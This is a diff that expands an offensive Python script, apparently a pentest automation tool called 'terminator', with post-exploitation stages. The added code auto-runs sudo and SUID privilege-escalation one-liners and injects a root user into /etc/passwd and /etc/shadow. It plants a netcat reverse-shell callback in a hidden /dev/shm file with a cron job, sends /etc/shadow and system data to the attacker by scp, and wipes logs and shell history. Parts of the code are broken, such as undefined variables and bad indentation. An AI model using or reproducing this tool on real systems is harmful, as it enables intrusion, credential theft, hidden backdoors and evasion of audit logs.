@@ -2,15 +2,17 @@
 # author: suffs811
 # https://github.com/suffs811/the-terminator.git
 # purpose: automate enumeration, privilege escalation, persistence, exfiltration, and reporting stages of a pentest
+# note: for full terminator productivity, you will need to run the script three separate times:
+# first on your own machine, second on the target machine after gaining initial shell, and third on local machine again to compile report.
 #
-# usage: python3 terminator.py enum -t <target_ip_to_enumerate> (optional: -w <path_to_directory_wordlist> (otherwise, terminator will use default list))
-# usage: python3 terminator.py exploit -u <user's_username> -p <user's_passwd> -l <local_ip> -x <local_listening_port> (optional: -f (avoid root permissions check))
-# usage: python3 terminator.py report -o <output_file_name>
+# usage (enumeration): python3 terminator.py enum -t <target_ip_to_enumerate> (optional: -w <path_to_directory_wordlist> (otherwise, terminator will use default list))
+# usage (exploitation): python3 terminator.py exploit -u <user's_username> -p <user's_passwd> -l <local_ip> -x <local_listening_port> (optional: -f (bypass root permissions check))
+# usage (reporting): python3 terminator.py report -o <output_file_name>
 
 '''
 TO DO:
 add local directory list file to github
-add scripts to terminator
+write report script
 test
 '''
 
@@ -20,16 +22,17 @@ import time
 import re
 
 
-parser = argparse.ArgumentParser(description="script for automating common enumeration techniques\nusage: python3 enum.py 10.0.0.1")
+# set command line flags and corresponding global variables
+parser = argparse.ArgumentParser(description="script for automating common enumeration techniques\nstage one - enumeration: python3 terminator.py enum -t <target_ip_to_enumerate> (optional: -w <path_to_directory_wordlist> (otherwise, terminator will use default list))\nstage 2 - exploitation: python3 terminator.py exploit -u <user's_username> -p <user's_passwd> -l <local_ip> -x <local_listening_port> (optional: -f (bypass root permissions check))\nstage 3 - reporting: python3 terminator.py report -o <output_file_name>")
 parser.add_argument("level", help="use terminator to enumerate target machine from local machine", required="True")
-parser.add_argument("-t", "--targetip", help="specify target ip to enumerate")
-parser.add_argument("-w", "--wordlist", help="specify wordlist for directory walking (gobuster)")
-parser.add_argument("-u", "--username", help="specify targeted user's username")
-parser.add_argument("-p", "--password", help="specify targeted user's password if known")
-parser.add_argument("-l", "--localip", help="specify your (local) ip for data exfiltration and backdoor callback")
-parser.add_argument("-x", "--localport", help="specify your (local) port for backdoor callback")
-parser.add_argument("-f", "--force", help="force bypass of root permissions check (optional)", required=False, action="store_true")
-parser.add_argument("-o", "--output", help="specify name for report")
+parser.add_argument("-t", "--targetip", help="(enum) specify target ip to enumerate")
+parser.add_argument("-w", "--wordlist", help="(enum) specify wordlist for directory walking (gobuster)")
+parser.add_argument("-u", "--username", help="(exploit) specify targeted user's username")
+parser.add_argument("-p", "--password", help="(exploit) specify targeted user's password if known")
+parser.add_argument("-l", "--localip", help="(exploit) specify your (local) ip for data exfiltration and backdoor callback")
+parser.add_argument("-x", "--localport", help="(exploit) specify your (local) port for backdoor callback")
+parser.add_argument("-f", "--force", help="(exploit) force bypass of root permissions check (optional)", required=False, action="store_true")
+parser.add_argument("-o", "--output", help="(report) specify name for report")
 args = parser.parse_args()
 level = args.level
 ip = args.targetip
@@ -56,18 +59,17 @@ print('''
    |_|  |______|_|  \_\_|  |_|_____|_| \_/_/    \_\_|  \____/|_|  \_\
 \n
 \\ created by: suffs811
-\\ https://github.com/suffs811/Terminator.git
+\\ https://github.com/suffs811/the-terminator.git
 ''')
 
 
 # enumeration ###############################
 
-# get pwd
-pwd = os.getcwd()
+# run nmap scans
+def init_scan(ip):
+   # get pwd
+   pwd = os.getcwd()
 
-# run initial nmap scan
-def init_scan(ip,pwd):
-   
    ports = []
    services = {}
 
@@ -170,11 +172,373 @@ def nfs(ip):
    os.system("nmap -vv -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount {} -oN enum/nfs_nmap.txt".format(ip))
    print("\n### nfs enum output saved to enum/nfs_nmap.txt ###")
 
+
 # privilege escalation ###############################
+
+# disable history logging and create backups
+def disable_hist():
+    # check to see if user needs password to run sudo
+    sudo_time = os.system("time timeout -k 5 5 sudo -l > /tmp/sudo_l.txt")
+    sudo_no_pass = None
+    if sudo_time > float('1.0'):
+        sudo_no_pass = False
+    else:
+        sudo_no_pass = True
+
+    print("\n### creating backups of log files... ###")
+    os.system("mkdir /tmp/.backups")
+    os.system("cp /var/log/auth.log /tmp/.backups/ 2>/dev/null")
+    os.system("cp /var/log/cron.log /tmp/.backups/ 2>/dev/null")
+    os.system("cp /var/log/maillog /tmp/.backups/ 2>/dev/null")
+    os.system("cp /var/log/httpd /tmp/.backups/ 2>/dev/null")
+    os.system("cp ~/.bash_history /tmp/.backups/ 2>/dev/null")
+    os.system("cp /root/.bash_history /tmp/.backups/ 2>/dev/null")
+    os.system("echo $history > /tmp/.backups/history 2>/dev/null")
+    os.system("history -c 2>/dev/null")
+    os.system("history -w 2>/dev/null")
+    
+    # create file to write data to
+    os.system("touch /tmp/pwd.txt")
+    
+    return sudo_no_pass
+
+
+# check for binaries that can be run as sudo and print privesc script to screen
+def sudo_l():
+    print("\n###--- please run 'sudo -l > /tmp/sudo_l.txt' before running this script to find sudoable commands ---###")
+    time.sleep(5)
+    print("\n### finding binaries you can run as sudo... ###")
+
+    # commands that will be printed to screen bc they require user interation 
+    sudo_bins_print = {
+        "curl":"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE (to get remote file)",
+        "ftp":"sudo ftp\n!/bin/sh",
+        "more":"TERM= sudo more /etc/profile\n!/bin/sh",
+        "nano":"sudo nano\n^R^X\nreset; sh 1>&0 2>&0",
+        "nc":"sudo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <localIP> <localPORT> >/tmp/f",
+        "openssl":"(on attack box:) openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n(on target box:) mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect <localIP>:<localPORT> > /tmp/s; rm /tmp/s"
+        }
+
+    # commands to execute if appears in sudo -l results
+    sudo_bins_exec = {
+        "all":"sudo /bin/bash -p",
+        "bash":"sudo /bin/bash -p",
+        "base64":"sudo base64 /etc/shadow | base64 --decode",
+        "cat":"sudo cat /etc/shadow",
+        "chmod":"sudo chmod 6777 /etc/shadow&&cat /etc/shadow",
+        "cp":"sudo cp /bin/sh /bin/cp\nsudo cp",
+        "crontab":"sudo crontab -e",
+        "docker":"sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+        "env":"sudo env /bin/sh",
+        "grep":"sudo grep '' /etc/shadow",
+        "gzip":"sudo gzip -f /etc/shadow -t",
+        "mount":"sudo mount -o bind /bin/sh /bin/mount&&sudo mount",
+        "mv":"LFILE=/etc/shadow&&TF=$(mktemp)&&echo 'root:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::' > $TF&&sudo mv $TF $LFILE&&echo 'su root, passwd is 'password''",
+        "mysql":"sudo mysql -e '\\! /bin/sh'",
+        "perl":"sudo perl -e \"exec '/bin/sh';\"",
+        "php":"CMD='/bin/sh'&&sudo php -r \"system('$CMD');\"",
+        "python":"sudo python -c 'import os; os.system(\"/bin/sh\")'",
+        "ruby":"sudo ruby -e 'exec \"/bin/sh\"'",
+        "scp":"TF=$(mktemp)&&echo 'sh 0<&2 1>&2' > $TF&&chmod +x '$TF'&&sudo scp -S $TF x y:",
+        "ssh":"sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x", 
+        "tar":"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
+        "vi":"sudo vi -c ':!/bin/sh' /dev/null", 
+        "vim":"sudo vim -c ':!/bin/sh'",
+        "wget":"TF=$(mktemp)&&chmod +x $TF&&echo -e '#!/bin/sh&&/bin/sh 1>&0' >$TF&&sudo wget --use-askpass=$TF 0"
+    }
+
+
+    # open last line of sudo -l output to determine sudo capabilities
+    with open('/tmp/sudo_l.txt', 'r') as pwd:
+        last_line = pwd.readlines()[-1]
+        lower_line = last_line.lower()
+        print(lower_line)
+
+        # loop through dictionaries and print cmds if need user interaction, otherwise execute
+        for key in sudo_bins_print:
+            if key in lower_line:
+                print("{}: {}".format(key,sudo_bins_print[key]))
+                continue
+            else:
+                continue
+
+        for key in sudo_bins_exec:
+            if key in lower_line:
+                print("{}: {}".format(key,sudo_bins_exec[key]))
+                sudo_cmd = sudo_bins_exec[key].strip()
+                os.system(sudo_cmd)
+                exit()
+            else:
+                continue
+
+
+# try SUID/GUID files exloitation
+def suid():
+    print("\n### finding SUID files... ###")
+    suid_bins_print = {
+    "curl":"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE",
+    "openssl":"(on attack box:) openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n(on target box:) mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect <localIP>:<localPORT> > /tmp/s; rm /tmp/s"
+    }
+
+    suid_bins_exec = {
+    "base64":"./base64 /etc/shadow | base64 --decode",
+    "bash":"./bash -p",
+    "chmod":"./chmod 6777 /etc/shadow&&cat /etc/shadow",
+    "cp":"./cp --attributes-only --preserve=all ./cp /etc/shadow",
+    "dig":"./dig -f /etc/shadow",
+    "docker":"./docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+    "env":"./env /bin/sh -p",
+    "file":"./file -f /etc/shadow",
+    "find":"./find . -exec /bin/sh -p \\; -quit",
+    "gzip":"./gzip -f /etc/shadow -t",
+    "mosquitto":"./mosquitto -c /etc/shadow",
+    "mv":"LFILE=/etc/shadow&&TF=$(mktemp)&&echo 'root:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::' > $TF&&./mv $TF $LFILE&& echo 'su root: passwd is 'password''",
+    "nmap":"LFILE=/etc/shadow&&./nmap -oG=$LFILE root:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::&& echo 'su root, passwd is 'password''",
+    "openvpn":"./openvpn --dev null --script-security 2 --up '/bin/sh -p -c 'sh -p''",
+    "perl":"./perl -e 'exec '/bin/sh';'",
+    "php":"CMD='/bin/sh'&&./php -r 'pcntl_exec('/bin/sh', ['-p']);'",
+    "python":"./python -c 'import os; os.execl('/bin/sh', 'sh', '-p')'",
+    "rsync":"./rsync -e 'sh -p -c 'sh 0<&2 1>&2'' 127.0.0.1:/dev/null",
+    "ssh-agent":"./ssh-agent /bin/ -p",
+    "ssh-keygen":"./ssh-keygen -D ./lib.so",
+    "ssh-keyscan":"./ssh-keyscan -f /etc/shadow",
+    "sshpass":"./sshpass /bin/sh -p",
+    "strings":"./strings /etc/shadow",
+    "systemctl":"TF=$(mktemp).service&&echo '[Service]&&Type=oneshot&&ExecStart=/bin/sh -c 'id > /tmp/output'&&[Install]&&WantedBy=multi-user.target' > $TF&&./systemctl link $TF&&./systemctl enable --now $TF",
+    "unzip":"./unzip -K shell.zip&&./sh -p",
+    "vim":"./vim -c ':py import os; os.execl('/bin/sh', 'sh', '-pc', 'reset; exec sh -p')'",
+    "wc":"./wc --files0-from /etc/shadow",
+    "wget":"TF=$(mktemp)&&chmod +x $TF&&echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF&&./wget --use-askpass=$TF 0",
+    "zsh":"./zsh"
+    }
+
+    # loop through dictionaries and print cmds if need user interaction, otherwise execute
+    os.system("find / -type f -perm /4000 2>/dev/null | tee /tmp/pwd.txt")
+    with open("/tmp/sudo_l.txt") as suid_file:
+        suid = suid_file.readlines()
+        for line in suid:
+            if ".sh" in line:
+                print(line)
+            else:
+                continue
+        for key in suid_bins_print:
+            if key in suid:
+                print("\n{}: {}".format(key,value))
+            else:
+                continue
+
+        for key in suid_bins_exec:
+            if key in suid:
+                print("\n{}: {}".format(key,value))
+                suid_cmd = value.strip()
+                os.system(suid_cmd)
+                break
+            else:
+                continue
+
+
+# try SUID executables for $PATH exploitation
+def path():
+    print("\n### running strings on SUID executables & searching for cmds w/o fill path (might want to check manually as well)")
+    
+    common_cmds = ["base64", "bash", "chmod", "cp", "dig", "docker", "env", "file", "find", "gzip", "mosquitto", "mv", 
+    "nmap", "openvpn", "perl", "php", "python", "mysql", "rsync", "strings", "systemctl", "unzip", "vim", "wc", "wget", 
+    "zsh", "ls", "ftp", "apache2", "apache", "ssh", "ps", "ss", "cat", "touch", "mkdir", "cd", "rm", "nc", "service", 
+    "help", "smbclient", "echo", "more", "less", "head", "tail", "openssl", "mkpasswd", "pwd", "scp", "python3", "crontab", 
+    "git", "gh", "vi", "nano"]
+
+    os.system("mkdir /tmp/.path/")
+    print("\n### finding SUID executables that don't specify full path (for $PATH exploit) ###")
+    os.system("find / type f -perm /4000 2>/dev/null | tee /tmp/pwd.txt")
+    with open("/tmp/pwd.txt") as root_files:
+        lines = root_files.readlines()
+        for line in lines:
+            split_path = line.split("/")
+            split_path_1 = split_path[-1].strip()
+            print(line)
+            os.system("strings {} > /tmp/.path/root_{}".format(line,split_path_1))
+            with open("/tmp/.path/root_{}".format(split_path_1)) as strings_file:
+                lines_strings = strings_file.readlines()
+                for cmd in common_cmds:
+                    non_path_cmd = re.search("\s{}\s".format(cmd), str(lines_strings))
+                    if non_path_cmd:
+                        print("### {} does not specify full path of {} ###".format(line,cmd))
+                        os.system("touch /tmp/{}&&echo '/bin/bash -p' > /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line))
+                        break
+                    else:
+                        continue
+
+
+# try writing to /etc/passwd or /etc/shadow
+def pass_shadow():
+    print("\n### checking if /etc/passwd or /etc/shadow are writable... ###")
+
+    # check if /etc/passwd is writable and if so, add root user
+    os.system("ls -l /etc/passwd > /tmp/pwd.txt")
+    with open("/tmp/pwd.txt") as passwd:
+        perms = passwd.readline()
+        writable = re.search("\\A.......rw|\\A.......-w", perms)
+        if writable:
+            print("\n### /etc/passwd is writable! creating user 'root1':'password'... ###")
+            os.system("echo 'root1:$1$pass$1K/wwgbgGDqTdxG.EHS8F1:0:0:root1:/root:/bin/bash' >> /etc/passwd")
+            print("\n### root-group user 'root1':'password' created... :su root1 ###")
+        else:
+            print("\n*** /etc/passwd is not writable ***")
+
+    # check if /etc/shadow is writable and if so, add root user
+    os.system("ls -l /etc/shadow > /tmp/pwd.txt")
+    with open("/tmp/pwd.txt") as shadow:
+        perms = shadow.readline()
+        writable = re.search("\\A.......rw|\\A.......-w", str(shadow))
+        if writable:
+            print("\n### /etc/shadow is writable! creating user 'root1':'password'... ###")
+            os.system("echo 'root1:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::' >> /etc/shadow")
+            print("\n### root-group user 'root1':'password' created... :su root1 ###")
+        else:
+            print("\n*** /etc/shadow is not writable ***")
+
+
+# check for root
+def root_check():
+    os.system("id > /tmp/pwd.txt")
+    with open("/tmp/pwd.txt") as check:
+        read_check = check.readline()
+        if "root" in read_check:
+            print("\n-+- welcome, root -+-")
+        else:
+            print("\n-+- no privelege escalation path found... try manually -+-")
+
 
 # persistence ###############################
 
+# check for root permissions
+def perm_check():
+    os.system("whoami | tee /tmp/whoami.txt")
+   with open("/tmp/whoami.txt") as who_file:
+      who = who_file.readlines()[-1].strip()
+      if who == "root":
+         return True
+      else:
+         print("\n*** error: you do not have root permissions on local box; if this is a mistake, use -f to bypass root check ***")
+         return False
+            exit()
+
+
+# add user with root perms
+def add_user(username,password):
+   if username:
+      print("\n### establishing persistence... ###")
+      os.system("mkpasswd {} > /tmp/.backups/pass.txt".format(password))
+      pass_file = open("/tmp/.backups/pass.txt", "r")
+      new_user_pass = pass_file.readlines()[-1].strip()
+      os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
+      os.system("echo '{}:x:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,username,username))
+      os.system("usermod -aG sudo {}".format(username))
+      print("\n### user {} created and added to sudo group ###".format(username))
+      pass_file.close()
+   else:
+      print("\n*** error: username not specified: use -u to specify username ***")
+      return
+
+
+# create script for nc rev shell callback
+def callback(local_ip, local_port, username, password):
+   print("\n### creating callback script for {}:{} ###".format(local_ip,local_port))
+   os.system("mkdir /dev/shm/.data")
+   os.system("touch /dev/shm/.data/data_log")
+   os.system("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f' > /dev/shm/.data/data_log".format(local_ip,local_port))
+   os.system("chmod 100 /dev/shm/.data/data_log")
+   os.system("chmod 700 /dev/shm/.data/")
+   print("\n### callback placed at /dev/shm/.data/data_log ###")
+   #os.system("echo 'bash -i >& /dev/tcp/{}/{} 0>&1' > /dev/shm/.data/data-log.sh".format(local_ip,local_port))
+
+
+# create cronjob for executing callback script every 5 min
+def cron_make():
+   print("\n### creating cronjob to execute callback every 5 min... ###\n---cronjob: '5 * * * * /bin/bash /dev/shm/.data/data_log'---")
+   os.system("echo '5 * * * * /bin/bash ./dev/shm/.data/data_log' >> /etc/crontab")
+   print("\n### cronjob created ###")
+
+
 # data exfiltration ###############################
+def extract_clear(local_path):
+        # create file to write data to
+        os.system("/tmp/data_exfil.txt")
+
+        # write data to file
+        print("### exfiltrating data... ###")
+
+        # get system info and write to data file
+        print("")
+        os.system("id > /tmp/data_exfil.txt")
+        os.system("whoami > /tmp/data_exfil.txt")
+        os.system("netstat -tnpl > /tmp/data_exfil.txt")
+        os.system("id")
+        os.system("whoami")
+        os.system("netstat -tnpl")
+
+        print("\n### /etc/passwd: ###")
+        os.system("cat /etc/passwd >> /tmp/data_exfil.txt")
+        os.system("cat /etc/passwd")
+
+        print("\n### /etc/shadow: ###")
+        os.system("cat /etc/shadow >> /tmp/data_exfil.txt")
+        os.system("cat /etc/shadow")
+
+        print("\n### /etc/hosts: ###")
+        os.system("cat /etc/hosts")
+        os.system("cat /etc/hosts")
+
+        print("\n### /etc/crontab: ###")
+        os.system("cat /etc/crontab >> /tmp/data_exfil.txt")
+        os.system("cat /etc/crontab")
+
+        print("\n### /etc/exports: ###")
+        os.system("cat /etc/exports >> /tmp/data_exfil.txt")
+        os.system("cat /etc/exports")
+
+        print("\n### SUID files: ###")
+        os.system("find / type -f perm /4000 2>/dev/null >> /tmp/data_exfil.txt")
+        os.system("find / type -f perm /4000 2>/dev/null")
+
+        # exfil the data file to local machine
+        print("\n### sending data to root@{}... ###\n+input your local machine root password+".format(local_path))
+        os.system("scp /tmp/data_exfil.txt root@{}".format(local_path))
+        print("\n*** data_exfil.txt sent to {} ***".format(local_path))
+
+
+# cover tracks ###############################
+
+# reestablish history logging and replace log files
+def clear_tracks():
+        print("\n### clearing and replacing log files to previous state... ###")
+        os.system("echo ' ' > /var/log/auth.log 2>/dev/null")
+        os.system("echo ' ' > /var/log/cron.log 2>/dev/null")
+        os.system("echo ' ' > /var/log/maillog 2>/dev/null")
+        os.system("echo ' ' > /var/log/httpd 2>/dev/null")
+        os.system("history -c 2>/dev/null")
+        os.system("history -w 2>/dev/null")
+        os.system("echo ' ' > ~/.bash_history 2>/dev/null")
+        os.system("echo ' ' > /root/.bash_history 2>/dev/null")
+
+      # placing old contents back into logs
+        os.system("echo /tmp/.backups/auth.log > /var/log/auth.log 2>/dev/null")
+        os.system("echo /tmp/.backups/cron.log > /var/log/cron.log 2>/dev/null")
+        os.system("echo /tmp/.backups/maillog > /var/log/maillog 2>/dev/null")
+        os.system("echo /tmp/.backups/httpd > /var/log/httpd 2>/dev/null")
+        os.system("echo /tmp/.backups/.bash_history > ~/.bash_history 2>/dev/null")
+        os.system("echo /tmp/.backups/.bash_history > /root/.bash_history 2>/dev/null")
+        os.system("echo /tmp/.backups/history > $history 2>/dev/null")
+
+        print("\n### deleting script and exiting... ###")
+        os.system("rm -rf /tmp/.backups/ 2>/dev/null")
+        os.system("rm -rf /tmp/.path/ 2>/dev/null")
+        os.system("rm -rf /tmp/* 2>/dev/null")
+        os.system("rm -f /tmp/whoami.txt")
+        os.system("rm -f /tmp/pwd.txt")
+        os.system("rm -f /tmp/sudo_l.txt")
+        exit()
+
 
 # report ###############################
 
@@ -183,7 +547,7 @@ def nfs(ip):
 # call functions
 if level == "enum":
    # call enumeration functions
-   init_scan(ip,pwd)
+   init_scan(ip)
    for item in tot:
       if item == "80" or item == "8080" or item == "http":
          web(ip,wordlist)
@@ -197,13 +561,26 @@ if level == "enum":
       elif item == "111" or item == "nfs":
          nfs(ip)
       else:
-         print("\n### scan complete... view enum/ and continue with manual enumeration ###")
+        print("\n### scan complete... view enum/ and continue with manual enumeration ###")
 elif level == "exploit":
    # call exploit functions
+    disable_hist()
+    sudo_l()
+    suid()
+    path()
+    pass_shadow()
+    root_check()
+    # check for root permissions
+    is_root = perm_check()
+    if is_root or args.force:
+        disable_hist()
+        add_user(username, password)
+        callback(local_ip, local_port, username, password)
+        cron_make()
+    extract_clear(local_path)
    pass
 elif level == "report":
    # call report functions
    pass
 else:
    print("\n*** specify either 'enum', 'exploit', or 'report' ***")
-
